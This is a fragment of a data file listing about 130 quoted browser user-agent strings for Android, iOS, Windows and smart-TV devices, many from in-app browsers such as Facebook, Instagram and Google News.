"Mozilla/5.0 (Linux; Android 9; AFTKA Build/PS7646.3565N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.170 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0",
"Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 12; Pixel 3a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.167 Mobile Safari/537.36 OPR/77.0.4095.74331",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-S757BL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.34 Safari/537.36 HbbTV/1.4.1 (+DRM; LGE; 32LM6380PLC; WEBOS4.5 05.30.40; W45_M3R; DTV_W19R;) LaTivu_1.0.1_2019",
"Mozilla/5.0 (Linux; Android 11; CPH2219 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; M2101K7BNY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.29.71;]",
"Mozilla/5.0 (Linux; Android 11; SM-A035G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-G780F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 Klarna/23.22.213",
"Mozilla/5.0 (Linux; Android 10; MAR-LX1B; HMSCore 6.11.0.332; GMSCore 23.31.16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.322 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; RMX3630 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.57 Mobile Safari/537.36 [FB_IAB/FB4A;]",
"Mozilla/5.0 (Linux; Android 13; RMX3241 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 9; N20 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; moto g(7) power Build/QPOS30.52-29-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (29/10; 320dpi; 720x1371; motorola; moto g(7) power; ocean_t; qcom; pt_BR; 510206687)",
"Mozilla/5.0 (Linux; Android 11; CPH2021 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; 2109119DG Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (30/11; 440dpi; 1080x2166; Xiaomi; 2109119DG; lisa; qcom; it_IT; 510206032)",
"Mozilla/5.0 (Linux; Android 12; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.44",
"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A5326a [FBAN/FBIOS;FBDV/iPad14,5;FBMD/iPad;FBSN/iPadOS;FBSV/17.0;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5]",
"Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (33/13; 480dpi; 1080x2176; samsung; SM-G991B; o1s; exynos2100; en_GB; 510206698)",
"Mozilla/5.0 (Linux; Android 13; 22041219NY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]",
"Mozilla/5.0 (Linux; Android 10; SM-A013M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D47 Instagram 293.1.0.21.50 (iPhone15,3; iOS 16_3; fr_RU; fr; scale=3.00; 1290x2796; 498085230)",
"Mozilla/5.0 (Linux; Android 12; SM-G977B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 13; PGZ110) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.5.95.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5830.15 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5710.38 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 10; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaApp_Android/23.70.1 YaSearchBrowser/23.70.1 BroPP/1.0 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12.0.0; Pixel 3a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.46",
"Mozilla/5.0 (Linux; arm_64; Android 11; Infinix X663D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.3.104.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Doro 8040) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; T790Y Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; POT-LX1 Build/HUAWEIPOT-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 GNews Android/2022091350",
"Mozilla/5.0 (Linux; Android 12; M2004J19C Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Config/97.2.2371.72",
"Mozilla/5.0 (Linux; Android 13; CPH2273 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022086958",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 Instagram 298.0.0.19.114 (iPhone12,1; iOS 16_6; en_SE; en; scale=2.00; 828x1792; 509296496)",
"Mozilla/5.0 (Linux; U; Android 13; pt-br; Xiaomi 11 Lite 5G NE Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.35.0-gn",
"Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 13; CPH2211 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/nl_NL;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-A515F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 GNews Android/2022089220",
"Mozilla/5.0 (Linux; Android 10; moto e(7) Build/QOFS30.569-83-18) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-G996B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (33/13; 450dpi; 1080x2190; samsung; SM-G996B; t2s; exynos2100; nl_BE; 510206667)",
"Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 OPR/36.0.2128.0 OMI/4.8.0.129.Driver3.34, HbbTV/1.1.1 _TV_MT5806/201.003.248.001 (Philips, PUS7805, wired) CE-HTML/1.0 NETTV/4.6.0.2 SignOn/2.0 SmartTvA/5.0.0 WH1.0 en",
"Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]",
"Mozilla/5.0 (Linux; Android 13; NTH-NX9 Build/HONORNTH-N29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 GLS/96.10.1059.60",
"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/424.0.0.27.114;FBBV/510306677;FBDV/iPad7,6;FBMD/iPad;FBSN/iPadOS;FBSV/16.6;FBSS/2;FBCR/;FBID/tablet;FBLC/it;FBOP/0]",
"Mozilla/5.0 (Linux; Android 11; 22011119UY Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 GNews Android/2022108570",
"Mozilla/5.0 (Linux; Android 10; POCOPHONE F1 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; 220333QNY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36 Atom/1.4.1.54",
"Mozilla/5.0 (Linux; Android 12.0.0; Pixel 3 XL) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.43",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2658.14 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 13; 2203129G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.5.95.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OpenWave/96.4.1853.54",
"Mozilla/5.0 (Linux; Android 13; SM-A136B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; MI 8 Lite Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 11; CPH1951 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 6.0; LG-X230 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 10; SM-A750G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; STK-LX1 Build/HONORSTK-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A135F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022146282",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 GLS/94.10.7389.90",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.14.10.19041; 10.0.0.0.19044.3324) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19044",
"Mozilla/5.0 (Linux; Android 12; 220333QAG Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; moto g62 5G Build/S1SSS32.53-85-4-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; PEEM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GNews Android/2022086952",
"Mozilla/5.0 (Linux; Android 13; CPH2333 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]",
"Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 Agency/99.8.3217.18",
"Mozilla/5.0 (Linux; Android 11; M2006C3LG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (Linux; Android 13; LM-G900 Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 Instagram 298.0.0.19.114 (iPhone14,5; iOS 16_6; fr_FR; fr; scale=3.00; 1170x2532; 509296496)",
"Mozilla/5.0 (Linux; Android 10; SM-A600FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12.0.0; Mi 11 Pro) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.44",
"Mozilla/5.0 (Linux; Android 13; IN2013 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;]",
"Mozilla/5.0 (Linux; arm_64; Android 12; SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.4.94.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5715.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4395.117 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-G996B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.25.113;]/FB_MEXT_IAB",
"Mozilla/5.0 (Linux; Android 13; 2106118C Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; LM-G810 Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 7.0; Neffos X1 Max Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J415FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.127 Mobile Safari/537.36 [FB_IAB/FB4A;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.1 Mobile/15E148 Snapchat/12.49.0.51 (like Safari/8615.2.9.10.4, panda)",
"Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Unique/91.7.8706.7",
"Mozilla/5.0 (iPhone CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 FBAN/FBIOSFBDV/iPhone12,1FBMD/iPhoneFBSN/iOSFBSV/16.6FBSS/2FBID/phoneFBLC/en_Qaau_GBFBOP/5",
"Mozilla/5.0 (Linux; Android 12; 22126RN91Y Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0; wbxapp 1.0.0; zoomrc 4.4.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0; zoomrc 4.4.0)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 Windows-AzureAD-Authentication-Provider/1.0",
"Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 10; SM-G9600 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; DRA-L01 Build/HUAWEIDRA-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 Unique/97.7.8376.77",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]",
"Mozilla/5.0 (Linux; Android 13; SM-S906B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Home Assistant/2023.8.2-10992 (Android 13; SM-S906B)",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A805F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 BytedanceWebview/d8a21c6 musical_ly_31.0.0 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US FalconTag/C496EBC9-525F-49B9-8846-62DFF27D2CCF",
"Mozilla/5.0 (Linux; Android 9; moto e(6) plus Build/PTBS29.401-58-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ3A.230805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Home Assistant/2023.8.2-10992 (Android 13; Pixel 7)",
"Mozilla/5.0 (Linux; Android 11; Lenovo TB-X306X Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.226 Safari/537.36 GNews Android/2022143610",
"Mozilla/5.0 (Linux; Android 11; M2010J19SY Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Config/99.2.2481.82",
"Mozilla/5.0 (Linux; Android 9; STK-LX1 Build/HUAWEISTK-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2873.84 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5740.27 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 10; BMH-AN10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.7.58.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2890.86 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; SM-N970U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5750.44 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; arm_64; Android 12; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5785.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5895.173 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; rv:2.0b6pre) Gecko/20100908 Firefox/4.0b6pre",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Trailer/97.3.5042.43",
